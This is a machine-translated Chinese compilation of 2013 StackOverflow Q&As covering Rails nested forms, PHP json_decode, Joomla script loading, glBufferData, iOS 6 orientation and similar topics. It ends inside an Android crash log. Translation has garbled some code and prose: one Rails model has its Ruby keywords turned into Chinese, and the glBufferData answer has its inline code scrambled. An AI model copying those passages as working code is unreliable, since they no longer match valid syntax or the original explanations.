# StackOverflow 问答 14903000-14903999

# ruby-on-rails - 为什么我的生产环境中缺少 semantic_nested_form_for 方法？

> ID：14903006
> 
> 赞同：2
> 
> 时间：2013-02-15T20:42:24.943
> 
> 标签：ruby-on-rails, nested-form-for

我正在尝试切换站点以将nested_form gem 与我已经在使用的formtastic 结合使用，但我遇到了一个奇怪的错误。在开发中一切正常，测试通过。此错误仅在生产中发生。

访问使用的页面`semantic_nested_form_for`会导致以下错误：

```
ActionView::Template::Error (undefined method `semantic_nested_form_for' for #<#<Class:0x0000000524cca0>:0x00000004e46a70>):
    1: <%= semantic_nested_form_for(@volume) do |f| %>
    2:   <%= f.inputs do %>
    3:     <%= f.input :number, :label => 'Volume #', :input_html => {:style => 'width:100px;', :autofocus => true}, :hint => raw('Choose the volume number.') %>
    4:   <% end %>
  app/views/volumes/_form.html.erb:1:in `_app_views_volumes__form_html_erb__2632693694855646779_43838320'
  app/views/volumes/new.html.erb:3:in `_app_views_volumes_new_html_erb___2327298489284463705_41053660' 
```

gem 在我的 Gemfile 中，并且似乎安装正确：

```
[~/application/current]$ bundle show nested_form
/home/deployer/application/shared/bundle/ruby/1.9.1/gems/nested_form-0.3.1 
```

我什至可以`semantic_nested_form_for`在生产控制台中成功调用：

```
[~/application/current]$ rails c production
Loading production environment (Rails 3.2.12)
irb(main):001:0> helper.semantic_nested_form_for(Volume.new, url: '/volumes' do |f|
irb(main):002:2* f.inputs
irb(main):003:2> f.actions
irb(main):004:2> end
irb(main):005:1> 
```

此外，`semantic_form_for`本身工作正常，但`nested_form_for`（没有`semantic_`部分）不起作用，导致我认为这与`nested_form`.

我不认为 erb 代码与这个问题真正相关，但无论如何：

```
<%= semantic_nested_form_for(@volume) do |f| %>
  <%= f.inputs do %>
    <%= f.input :number, label: 'Volume #', input_html: {autofocus: true}, hint: 'Choose the volume number.' %>
  <% end %>

  <div id="issues_fields">
    <%= f.semantic_fields_for :issues %>
    <%= f.link_to_add 'Add an Issue', :issues %>
  </div>

  <%= f.actions do %>
    <%= f.action :submit, label: 'Save' %>
  <% end %>
<% end %> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:20:53.067

好吧，我有点傻眼了。Capistrano 在我部署时会重启 unicorn，在我问这个问题之前，我曾尝试手动重启 nginx 和 unicorn 以排除这种情况。在我提出这个问题后，我重新启动了整个生产服务器（我讨厌这样做）只是为了看看，现在它工作正常。

如果有人能告诉我为什么仅仅重启独角兽进程是不够的，我会将他们的答案标记为已接受的答案。

# php - PHP 5 类型提示（将 A 类型的对象数组传递给函数）

> ID：14903011
> 
> 赞同：0
> 
> 时间：2013-02-15T20:42:49.930
> 
> 标签：php, casting, type-hinting

我有一个接受类型参数的函数`A`（在 PHP 5 中）：

```
function f1(A a){...} 
```

我还有一个数组，我从`$_POST['val']`值中解码并将其发送到其他函数`f2`：

```
$array1 =  json_decode(stripslashes($_POST['val']));
f2($array1); 
```

现在我想调用`f1`其中的每个数组元素`f2`：

```
function f2(array $a){
    foreach($a as $element){
        f1($element);
} 
```

但我收到一个错误：

```
Argument 1 passed to f1() must be an instance of A, instance of stdClass given 
```

当我放入`if($element instanceof A)`里面时，`f2`我得到了`FALSE`，但我可以正确地调用's 方法。`$element``A`

如何“判断”`f1`类型是正确的？

`print_r`在`array1`(`name`和`sourceId`在) 上使用`A`：

```
Array
(
[0] => Array
    (
        [name] => connect
        [sourceId] => 12
    )

) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T20:46:32.347

json_decode 的第二个参数是一个布尔值，如果需要数组，请将其设置为“true”。

```
$array1 =  json_decode(stripslashes($_POST['val']), true); 
```

还要阅读安全性。轻信从 $_POST 获得的数据是个坏主意。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:03:58.233

json_decode 的输出是 stdClass 类型的对象，因此出现该错误是正常的。在 PHP 中从一种对象类型转换为另一种对象类型并不容易，但您可以使用这个技巧：

```
function f2(array $a){
    foreach($a as $element){
        f1 ( unserialize ( preg_replace ( "/O:\d+:\"\w+\":(.*)/", "O:1:\"A\":$1", serialize ($element) ) ) )
} 
```

这个肮脏的技巧实际上将 stdClass 转换为 A 类型的对象。

我希望这会有所帮助。

# android - 按下时如何禁用复选框的橙色突出显示

> ID：14903014
> 
> 赞同：1
> 
> 时间：2013-02-15T20:43:01.857
> 
> 标签：android

我在列表视图中有一个复选框。我在按下时禁用了列表视图的突出显示。此外，我禁用了列表视图的焦点，因为我在行本身中有按钮。

这很完美。但是问题是复选框仍然显示橙色突出显示。

无论如何禁用复选框的这个橙色突出显示（无论是通过列表视图还是通过复选框本身的某种方式？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T23:37:05.613

我还不能添加评论，但是您应该可以使用我提供的链接并以编程方式将样式设置为复选框以隐藏橙色突出显示，对吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T20:46:33.057

我相信禁用复选框突出显示的唯一方法是在没有按下 xml 的情况下创建自己的可绘制对象并保留使用它，但我认为没有任何复选框 xml 属性会停止突出显示.....

# xcode - xcrun clang --sysroot 找不到 stdio.h

> ID：14903017
> 
> 赞同：5
> 
> 时间：2013-02-15T20:43:30.280
> 
> 标签：xcode, clang, xcrun

使用Xcode 4.6，在Mac OS X 10.8.2下，为了编译hello.c，我发出了[xcrun gcc中推荐的xcrun命令找不到头文件](https://stackoverflow.com/questions/11838993/)，但仍然收到找不到头文件stdio.h的错误。

```
 $ xcrun clang --sysroot /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.8.sdk/ -o hello hello.c
 hello.c:2:10: fatal error: 'stdio.h' file not found
 #include <stdio.h>
     ^
 1 error generated.
 $ cat hello.c
 /* C program, Hello World */
 #include <stdio.h>
 int main()
 {
  printf("Hello World \n");
 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-26T18:50:16.560

it should work with : xcrun clang -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.8.sdk/

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-01T19:05:57.627

由于未指定，我`Build Settings`为该项目更改了我的。`Base SDK`一旦我将其更改为`OS X 10.7`（或者您使用的任何内容都可以），我就能够成功编译所有内容而无需更改其他构建配置。

# javascript - 将 javascript 添加到 Joomla 网站的负责人

> ID：14903018
> 
> 赞同：6
> 
> 时间：2013-02-15T20:43:37.143
> 
> 标签：javascript, joomla

我已经阅读了一些 Joomla 教程，但我不明白 Joomla 是如何工作的。我从来没有遇到过它的各个方面都逃避我的事情。我不是要搭便车..只是去哪里或者这是如何工作的基本想法。

我只需要将 Panoramio javascript 添加到`<head></head>`joomla 网站的部分。在 Word Press 中，我只需下载 header.php 模板和代码即可。

理解 Joomla 真是令人困惑。我不知道不能直接粘贴到“文章”页面，所以我是否必须安装某种扩展程序或工具才能让它工作？

我阅读以在我的模板中编辑 index.php，但我什至找不到。我是唯一一个根本无法理解 Joomla 的人吗？即使是初学者文档似乎也假设我知道他们的系统。先感谢您。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-16T14:18:00.400

请注意将代码添加到哪些文件。编辑模板文件夹中的 index.php 等核心文件可能不是最佳解决方案。如果有模板更新怎么办？该文件将被覆盖。所以只要记住这一点。

在添加脚本之前，最好先获取当前模板的名称：

```
$app = JFactory::getApplication();
$template = $app->getTemplate(); 
```

您可以使用以下内容导入`.js`文件的`<head>`标签：

```
$doc = JFactory::getDocument(); //only include if not already included
$doc->addScript(JUri::root() . 'templates/' . $template . '/file.js'); 
```

或者你可以在那里添加Javascript，然后像这样：

```
$doc = JFactory::getDocument();
$js = "
       //javascript goes here
      ";
$doc->addScriptDeclaration($js); 
```

希望这可以帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-29T10:32:12.013

您可以编辑 index.php 文件和其他模板文件作为 css 等。

转到：扩展->模板管理器

选择了模板 TAB

从左数第二个您会看到：“模板名称”详细信息和文件在这里您可以直接在您的服务器上编辑任何模板文件。

菜单可以根据 Joomla 版本而改变，但这是一般的想法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T21:41:26.210

你绝对不是唯一一个。Joomla 旨在能够处理您需要它做的任何事情，这使得它变得相当复杂。

最好的办法是将脚本添加到您提到的模板 index.php 文件中，如果您希望它在整个站点中可用。如果您只是需要它用于特定的模块或组件，您可能希望将它加载到那里。在您的情况下，由于您对 Joomla 还很陌生，所以让我们加载它吧！

导航到您的基本 Joomla 目录（安装 Joomla 的位置）并查找模板文件夹。在这个里面你应该有几个文件夹。希望您知道您当前使用的是哪个模板并打开该文件夹，其中应该有一个 index.php 文件。该文件的顶部应该类似于 Wordpress 中的 header.php 文件。将您的脚本标签添加到标题元素，它应该加载。

如果您不知道当前模板的名称是什么，请转到后端的 Extensions->Template Manager。应该有两个在他们的右边有星星。一个应标记为“管理员”，另一个应标记为“站点”。您在模板文件夹中查找的文件夹应与“站点”模板的名称匹配。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T21:44:07.433

这是有关您需要做什么的快速教程：

*   Joomla！模板位于`/templates`文件夹中（找到您的模板）
*   在里面你找到 index.php 文件（你需要改变的东西）
*   在里面你会发现一个 html 页面，里面有一些 PHP
*   定位`<head>`标签

如何添加这个：

`$doc->addScript($this->baseurl.'/templates/'.$this->template.'/javascript/YOURSCRIPT.js', 'text/javascript');`

确保这行代码已经存在：

`$doc = JFactory::getDocument();`

脚注：因为您没有指定 Joomla! 您正在使用的版本，这个例子来自 Joomla！2.5，目前的LTS。

PS您也可以在`<head>`标签之后以“正常”方式插入脚本。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-11T08:55:29.347

我不是 JavaScript 方面的专家，但我有一个 AJAX 应用程序，它无需修改任何模板文件即可完美运行。问题是它在页面底部添加了 JavaScript，而不是在头部。我不知道这是否是一个问题，但它对我有用。

1）转到扩展 - >模块管理器

2) 创建一个新模块。称它为 JavaScript 页脚（例如）

3) 在 Details 选项卡下将 Show Title 设置为 Hide，将 Position 设置为 Debug，将 Status 设置为 Published，并将 Access 设置为 Public

4) 在自定义输出选项卡下，输入 <script type="text/javascript" src="http://yourdomain.com/yourscript.js"></script>

我从来不明白为什么有些脚本在标题中，而另一些在正文底部（例如谷歌分析），但它对我有用。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-11-01T15:32:12.167

Joomla 与 Wordpress 完全不同。实际上，index.php 在自定义 joomla 模板时是相当无用的。您必须在模板中找到的文件夹块中探索模板块。例如，要在标题部分添加脚本，只需编辑目录 your_template/blocks 中的 header.php。

# ruby-on-rails - 通过 has_many 使用嵌套表单 - 无法分配质量属性

> ID：14903019
> 
> 赞同：1
> 
> 时间：2013-02-15T20:43:38.100
> 
> 标签：ruby-on-rails, ruby, nested-forms, has-many-through

我已经在这里阅读了几乎所有关于 has_many 通过关联的嵌套表单的问题，但我无法让我的模型工作。有人可以帮忙吗？

有 2 个模型：原型和裙子偏好，通过裙子偏好模型链接。

以下是模型：

> class Archetype < ActiveRecord::Base attr_accessible :occasion, :skirt_partworth, :title, :skirtpreferencings_attributes
> 
> has_many :skirtpreferences has_many :SkirtPreferences, :through => :skirtpreferences accept_nested_attributes_for :SkirtPreferences accept_nested_attributes_for :skirtpreferences end
> 
> 块引用
> 
> 类 Skirtpreferencing < ActiveRecord::Base attr_accessible :archetype_id, :skirt_preference_id, :skirtpreferencing_attributes
> 
> belongs_to :archetype belongs_to :SkirtPreferences 接受_nested_attributes_for
> :SkirtPreferences
> 
> 结尾
> 
> 类 SkirtPreference < ActiveRecord::Base attr_accessible :archetype_id, ....
> 
> has_many :skirtpreferences has_many :archetypes, :through => :skirtpreferences
> 
> 结尾

表单看起来像这样，并且显示得很好：

> <%= form_for(@archetype) 做 |f| %> ... <%= f.fields_for :skirtpreferencing do |preference_builder| %> <%= preference_builder.fields_for :SkirtPreferences do |builder| %> <%= render "skirt_preferences_field", :f => builder %> <% end %> <% end %> ...

我想我必须在控制器中做一些事情，但我不确定到底是什么。

谢谢！

添加控制器：

```
class ArchetypesController < ApplicationController

 def new
 @archetype = Archetype.new
 @archetype.skirtpreferencings.build
end

    # GET /archetypes/1/edit
def edit
  @archetype = Archetype.find(params[:id])
end

 def create
 @archetype = Archetype.new(params[:archetype])     
end 

class SkirtPreferencesController < ApplicationController   

 def new
 @skirt_preference = SkirtPreference.new
 end 

 def edit
 @skirt_preference = SkirtPreference.find(params[:id])
 end

 def create
 @skirt_preference = SkirtPreference.new(params[:skirt_preference])

 end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:17:10.323

我猜这是 SkirtPreference 和 Archetype 之间的多对多关系，而 SkirtPreferencing 是 SkirtPreference 和 Archetype 之间的关联？

尝试从 更改`skirtpreferencing_attributes`为`skirtpreferences_attributes`。这是我的预感。因为您正在尝试将数据添加到 skritpreferences，而不是仅用于在skirtpreferences 和原型之间关联的skirtpreferences。

我也觉得这很不寻常。

`has_many :SkirtPreference, :through => :skirtpreferencings`

`accepts_nested_attributes_for :SkirtPreference`

...

`belongs_to :SkirtPreference`

`accepts_nested_attributes_for :SkirtPreference`

所有这些通常应该是`:skirtpreferences`.

* * *

** 编辑 1 **

假设表单是在 ArchetypesController 中的新操作中生成的......

您似乎错过了根据原型构建裙子偏好属性的部分。

所以在你在 ArchetypesController 的新动作中

```
def new
  @archetype = Archetype.new
  @archetype.skirtpreferencings.build
  ...
end 
```

** 编辑 2 **

`SkirtPreferences`应更改为`skirtpreferences`除了类名。

你可以尝试更改`f.fields_for :skirtpreferencing do`为`f.fields_for :skirtpreferencings do`

# objective-c - 将实例的一个属性与其他实例的数组进行比较

> ID：14903020
> 
> 赞同：2
> 
> 时间：2013-02-15T20:43:47.767
> 
> 标签：objective-c, cocoa, comparison

我正在尝试为`Card`将单个卡与数组进行比较的类编写实例方法。该类具有一些属性，例如：`shape`和`color`. `otherCards`数组中填充了此类的其他实例，它们也有它们的`shape`s 和`color`s。

现在，我想编写一个可以分别检查所有这些属性的方法。如何传递特定属性，如：`[allAttributesIsEqual:otherCards compareWith: self.shape]`？所以我可以传入`self.shape`或`self.color`实际比较时？

```
- (BOOL)allAttributesIsEqual: (NSArray *)otherCards
{
    //self.shape is equal to othercards.shape
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:03:49.093

你不能只传入`self.shape`，因为这会给你财产的*价值*。不过，感谢 Cocoa/ObjC 的一些 dynamite，您可以传入属性（或方法）的*名称并稍后获取结果。*

聪明的（我敢说，甚至可能是“Pythonic”）方式：

```
// The name of the property we're interested in.
NSString * key = @"color";
// Get the values of that property for all the Cards in the array, then
// collapse duplicates, because they'll give the same results when comparing
// with the single card.
NSSet * vals = [NSSet setWithArray:[arrayOfCards valueForKey:key]];
// Now, if the set has only one member, and this member is the same
// as the appropriate value of the card we already have, all objects
// in the array have the same value for the property we're looking at.
BOOL colorIsEqual = ([vals count] == 1 && [vals containsObject:[myCard valueForKey:key]]); 
```

然后你的方法可以如下所示：

```
- (BOOL)allOtherCards: (NSArray *)otherCards haveEqualAttribute: (NSString *)key; 
```

然而， Dan F 建议为`- (BOOL)<#property#>Equal: (NSArray *)otherCards;`您感兴趣的每个属性实施这一点并不是一个坏主意。当然，这些中的每一个都可以调用基本的“聪明”版本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T20:54:16.717

这个想法是您（作为 Card 类）知道两个实例“相等”意味着什么。听起来在您的情况下，如果两张卡片的颜色和形状属性匹配，则它们是等效的。首先在您的自定义 Card 类上实现`-isEqual:`（连同）。`-hash`这是让一个对象公开它是否与其他对象相同的概念的标准方法。您可以根据需要执行此操作。在此`isEqual`方法中，您可以检查所有相关属性：

```
- (BOOL)isEqual:(id)otherObject
{
    if (![otherObject isKindOfClass:[self class]) {
        return NO;
    }
    Card * otherCard = (Card *)otherObject;
    // now compare the attributes that contribute to "equality"
    return ([self.shape isEqual:otherCard.shape] && [self.color isEqual:otherCard.color]);
} 
```

现在，一旦您的自定义对象支持此 -isEqual:，您就可以检查数组中的所有卡片以查看是否有任何卡片与候选卡片相等。您可以自己执行循环并使用 -isEqual:，但是以系统标准方式执行此操作的好处是您还可以使用系统提供的便捷方法来检查集合成员资格，例如：

```
if ([myCardList containsObject:candidateCard]) {
    // one of the cards compared as "equal"
} 
```

如果您希望在类的方法中请求时执行此操作，则可以像这样构造它：

```
- (BOOL)isRepresentedInArray:(NSArray *)arr
{
    return [arr containsObject:self];
} 
```

# c# - 远程设置文件

> ID：14903025
> 
> 赞同：3
> 
> 时间：2013-02-15T20:44:09.813
> 
> 标签：c#

我正在处理一个 C# 项目，我想将管理员的设置存储在设置文件（不是 app.config）中，我想知道这个设置文件是否可以存储在远程位置，如服务器数据库或另一台计算机同一个局域网，这实际上是最好的事情，因为我想将管理员的设置推送到所有计算机，所以一个文件是必不可少的。这甚至可能吗？如果是，请有人指出我正确的方向（教程、链接、文档等）如何创建设置文件以及如何建立与它的远程连接。

我考虑过使用数据库，但我没有看到使用它来存储设置的便利。你们怎么看/建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T20:54:21.863

Visual Studio / .NET 中没有远程应用程序设置文件的概念。但是，您可以通过多种方式存储和使用远程设置，无论是通过文件还是数据库。

你需要问自己的几个问题是......

它是否在本地网络上，并且仅由本地网络上的客户端软件使用？例如，如果您在公司网络上编写 Intranet 应用程序，就会出现这种情况。

如果是这样，那么您可以使用共享驱动器来托管文件，并从具有相同确切文件路径的任何客户端读取它。

如果您打算在互联网上使用它，您可以创建某种类型的服务，该服务在调用时会返回一个文件。如果它是从 Apache 或 IIS 等 Web 服务器提供的，则类似于 Web 服务。

如果它通过互联网，我只建议使用数据库。仅仅因为它已经设置为通过网络使用数据，并且您的记录只是一个数据结构，它可以存储在具有 x 个字段的文件中，也可以存储在具有 x 个字段的数据库表记录中，付出相同的努力。

* * *

## 自定义配置文件的示例代码

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace TestAsync.Services
{
    public static class AppSettings
    {
        public static string SettingsFileLocation {get; set;}

        public static string Setting1 { get; set; }
        public static string Setting2 { get; set; }
        public static DateTime Setting3 { get; set; }

        static AppSettings()
        {           
            SettingsFileLocation = @"C:\Wherever\Whatever.config";
            LoadConfiguration();
        }

        public static void LoadConfiguration()
        {
           using(var fs = new StreamReader(File.OpenRead(SettingsFileLocation)))
           {
               Setting1 = fs.ReadLine();
               Setting2 = fs.ReadLine();
               Setting3 = DateTime.Parse(fs.ReadLine());
               fs.Close();
           }

        }

        public static void SaveConfiguration()
        {
            using (var fs = new StreamWriter(File.OpenWrite(SettingsFileLocation)))
            {
                fs.WriteLine(Setting1);
                fs.WriteLine(Setting2);
                fs.WriteLine(Setting3.ToShortDateString());
                fs.Flush();
                fs.Close();
            }
        }
    }
} 
```

# opengl - glBufferData 实际上是根据现场大小分配内存吗？

> ID：14903029
> 
> 赞同：2
> 
> 时间：2013-02-15T20:44:35.227
> 
> 标签：opengl

我想知道，如果我使用`glBufferData`，它会在我调用它时准确地分配内存（也就是如果 size 参数大于可用内存，那么它会崩溃）还是它有某种特殊的及时规则仅当我实际将数据复制到缓冲区时才分配内存？

为了更简洁，我的问题将通过回答一个更实际的问题来回答：

这将占用 GPU 上的多少内存：

```
glBufferData(GL_ARRAY_BUFFER, 1000, NULL, GL_DYNAMIC_DRAW); 
```

然后，当您在同一个缓冲区上执行此操作时，占用的内存将如何变化：

```
glBufferSubData(GL_ARRAY_BUFFER, 0, sizeof(poly), &poly); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-15T21:14:21.097

> 这将占用 GPU 上的多少内存：
> 
> ```
> glBufferData(GL_ARRAY_BUFFER, 1000, NULL, GL_DYNAMIC_DRAW); 
> ```

不能保证这会在“GPU”上分配*任何内存。*驱动程序很可能决定将缓冲区对象放在 CPU 内存中而不是 GPU 中。

相反，我会假设您的问题是“将为缓冲区对象分配多少内存？”

1000 字节。这就是您要求的，这就是驱动程序将分配的。

> 然后，当您在同一个缓冲区上执行此操作时，占用的内存将如何变化：
> 
> ```
> glBufferSubData(GL_ARRAY_BUFFER, 0, sizeof(poly), &poly); 
> ```

如果当前绑定的缓冲区对象已`GL_ARRAY_BUFFER`为其分配了存储空间，并且该存储空间至少包含`sizeof(poly)`字节，那么它将通过将第一个`sizeof(poly)`字节复制到存储空间中来修改缓冲区的存储`&poly`空间。

如果它没有分配存储空间，或者存储空间小于`sizeof(poly)`字节，则会出现`GL_INVALID_VALUE`错误。

*分配*的大小没有改变。就像调用返回的指针`malloc`时，返回的分配大小不会改变一样。就像; 它分配存储（可以选择进入该存储）。就像; 它将数据复制到*现有*存储中。`memcpy``glBufferData``malloc``memcpy``glBufferSubData``memcpy`

 *就像你不能不`memcpy`先分配一样，你不能不先调用`glBufferSubData`就调用`glBufferData`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T20:46:46.177

从[文档](http://www.opengl.org/sdk/docs/man2/xhtml/glBufferData.xml)：

> `GL_OUT_OF_MEMORY`如果 GL 无法使用指定的`size`.

还：

> 如果`data`是`NULL`，仍会创建指定大小的数据存储，但其内容仍未初始化，因此未定义。*

# ios - iOS 应用程序的 iPad 方向 - 自新版本以来

> ID：14903031
> 
> 赞同：0
> 
> 时间：2013-02-15T20:44:39.470
> 
> 标签：ios, ipad

上次我运行我制作的 iOS 应用程序时，它必须已针对部署目标 5.0 和相关的 SDK 启用（有可能早在 4.3 时就已启用）。部署现在是 6.1。我的应用程序只运行横向并在横向上运行良好。但是在我更新了我的 iPad 和 iOS SDK 并在大约一年内第一次运行这个应用程序之后，似乎有些事情发生了变化。

这些按钮显示为 iPad 处于纵向模式。这是错误的，因为它应该在横向（并且它曾经工作得很好）。

最新更新中发生了什么变化？

我在 Xcode 中支持的界面方向仅选择了“横向右”，在信息部分我只有一个项目“支持的界面方向”：“横向（右主页按钮）”。

在应用程序首次打开时打开的主视图控件中，我有

```
-(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation { 
    return (interfaceOrientation == UIInterfaceOrientationLandscapeRight ||
            interfaceOrientation == UIInterfaceOrientationLandscapeLeft);
} 
```

还有第一行`viewDidLoad`是

```
self.view.frame = CGRectMake(0, 0, 1024, 768); 
```

那么为什么代码绘制按钮就像是在纵向模式下呢？

* * *

**更新**

我试图`shouldAutorotateToInterfaceOrientation`用

```
- (NSUInteger)supportedInterfaceOrientations{
    return UIInterfaceOrientationLandscapeRight & UIInterfaceOrientationLandscapeLeft;
} 
```

但它仍然不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T10:04:30.077

**iOS6.0中的方向变化**

您应该实现以下方法

```
-(BOOL)shouldAutorotate
{
  return YES;
}

-(NSUInteger)supportedInterfaceOrientations
{
   return UIInterfaceOrientationMaskLandscape;
}

// Set the initial preferred orientation
-(UIInterfaceOrientation)preferredInterfaceOrientationForPresentation
{
   return   UIInterfaceOrientationLandscapeRight;
} 
```

**注意**
如果您正在使用`TabBarController/NavigationController`，您应该对这些视图控制器进行子类化以覆盖方向方法，以便它应该调用您自己的视图控制器方法。这是iOS6中的一个重大变化。

```
 #import "UINavigationController+Orientation.h"

@implementation UINavigationController (Orientation)

-(NSUInteger)supportedInterfaceOrientations
{
   return [self.topViewController supportedInterfaceOrientations];
}

-(BOOL)shouldAutorotate
 {
   return YES;
 }

 @end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T20:50:35.227

`shouldAutorotateToInterfaceOrientation`在 iOS 6 中已弃用，您应该 `supportedInterfaceOrientations`覆盖`UIViewController`

有来自doc的报价：

> 在 iOS 6 中，您的应用支持在应用的 Info.plist 文件中定义的界面方向。视图控制器可以覆盖supportedInterfaceOrientations 方法来限制支持的方向列表。一般情况下，系统只会在窗口的根视图控制器或呈现为填满整个屏幕的视图控制器上调用该方法；子视图控制器使用其父视图控制器为它们提供的窗口部分，并且不再直接参与有关支持哪些旋转的决策。应用程序的方向掩码和视图控制器的方向掩码的交集用于确定视图控制器可以旋转到哪些方向。
> 
> 你可以覆盖一个视图控制器的 preferredInterfaceOrientationForPresentation，该视图控制器旨在以特定方向全屏显示。

# mobile - 进入或离开工业空间等固定位置时，在移动设备上启用/禁用 Wi-Fi 通信

> ID：14903037
> 
> 赞同：1
> 
> 时间：2013-02-15T20:45:09.073
> 
> 标签：mobile, geolocation, gps, wifi, geofencing

我有一个拥有工业空间的客户。在这个空间里，他们有自动化机器，可以向上/向下、侧向、向前/向后移动，并通过向上摆动机器的底部来完全抬起。为了控制这些设备，他们有一个带有继电器的大型系统盒，基本上告诉哪个开关要激活。这个控制箱位于工业空间的中心。他们想要的是将所有逻辑和系统文件存储在“控制中心”盒子（位于空间中间）中，然后能够同时操作单个机器或多台机器，同时或同时操作，同时亲自在空间中移动。与他们交谈后，他们对我们在控制中心开发基于 Wi-Fi 的界面的想法很感兴趣，然后能够使用移动设备（手机或平板电脑）与之通信。Wi-Fi 和移动应用程序的概念很容易编写，问题是它们有两个问题：个人安全和网络安全。

为了人身安全，如果用户不在同一个房间或空间，他们需要移动设备无法连接或操作设备。这意味着，他们无法按下平板电脑上的按钮，走开或离开视线，也看不到机器是否正在压伤员工，或者员工是否没有在设备上玩耍和晃来晃去。因此，它们实际上必须在视线范围内才能注意安全。

为了安全起见，他们希望能够通过 Wi-Fi 连接到控制中心并操作系统。他们不希望其他拥有智能设备或笔记本电脑的人能够访问、破解它并查看地址等。

我最初是想用 GPS 卫星建立 GeoPolygon（GeoFence），利用经纬度，来绘制工业空间的周长。然后，当用户进入或退出该空间时，GPS 将触发推送通知（如四方签到），并禁用/启用 Wi-Fi 连接，从而让用户知道 Wi-Fi 处于开启状态或关闭，他们可以或不能访问控制中心来操作机器。

我发现的问题是 GPS 可能不可靠，尤其是在室内、城市景观中或存在大量频率静态或干扰时。

所以，为了结束我的长篇故事，我想知道是否有人对我如何根据用户的位置以及用户何时进出固定位置空间来打开或关闭 Wi-Fi 访问有任何合理的想法（即仓库）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-18T21:47:47.337

GPS 不提供 18 英寸的精度。
在室内，GPS 可能根本不工作，或者有 30m 或更大的误差。

3-6m以外是正常的，在城市每天也会发生高达30m的误差（在开车回家的20分钟路程中，经过道路左右高度为18m的房屋。）

Wifi 也适用于更远的距离，您无法获得与设备的距离。

您可能需要的是另一件事：

**NFC** : Near Field Communication
直到当前的 Iphone 5，不支持 NFC。也许是下一代或一些 Android 手机。

至少你现在知道什么是行不通的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-01T20:22:11.183

我听说了为了阻止wifi连接而制作的壁纸，也许你可以把这个壁纸放在房间里，做更多的网络，所以只有房间里的人才能控制这个房间，而不是把那个wifi调制解调器用电缆连接到一些网络控制PC上并通过它你也可以远程控制那个房间。

# java - 在 Eclipse 中运行应用程序时出错

> ID：14903039
> 
> 赞同：0
> 
> 时间：2013-02-15T20:45:18.813
> 
> 标签：java, android, eclipse

我在 Eclipse 中运行我的应用程序时遇到问题。当我运行我的应用程序时，它立即崩溃并说`Unfortunately (App name) has stopped.`

该应用程序是一个简单的 2 屏幕票价应用程序。第一页只有一个文本视图、图像视图和按钮。第二页有一个文本视图、微调器、编辑文本、按钮和另一个文本视图。它几乎结合了 Android Bootcamp 书中的第 2 章和第 3 章。

这是logcat信息：

```
02-15 14:31:28.061: D/dalvikvm(536): Not late-enabling CheckJNI (already on)
02-15 14:31:28.851: D/dalvikvm(536): GC_FOR_ALLOC freed 67K, 3% free 9936K/10179K, paused 51ms
02-15 14:31:28.851: I/dalvikvm-heap(536): Grow heap (frag case) to 10.257MB for 494176-byte allocation
02-15 14:31:28.941: D/dalvikvm(536): GC_CONCURRENT freed 1K, 3% free 10417K/10695K, paused 7ms+3ms
02-15 14:31:28.971: D/AndroidRuntime(536): Shutting down VM
02-15 14:31:28.971: W/dalvikvm(536): threadid=1: thread exiting with uncaught exception (group=0x409961f8)
02-15 14:31:28.981: E/AndroidRuntime(536): FATAL EXCEPTION: main
02-15 14:31:28.981: E/AndroidRuntime(536): java.lang.RuntimeException: Unable to start activity ComponentInfo{net.androidbootcamp.racetickets/net.androidbootcamp.racetickets.Main}: java.lang.NullPointerException
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1955)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1980)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.app.ActivityThread.access$600(ActivityThread.java:122)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1146)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.os.Handler.dispatchMessage(Handler.java:99)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.os.Looper.loop(Looper.java:137)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.app.ActivityThread.main(ActivityThread.java:4340)
02-15 14:31:28.981: E/AndroidRuntime(536):  at java.lang.reflect.Method.invokeNative(Native Method)
02-15 14:31:28.981: E/AndroidRuntime(536):  at java.lang.reflect.Method.invoke(Method.java:511)
02-15 14:31:28.981: E/AndroidRuntime(536):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
02-15 14:31:28.981: E/AndroidRuntime(536):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
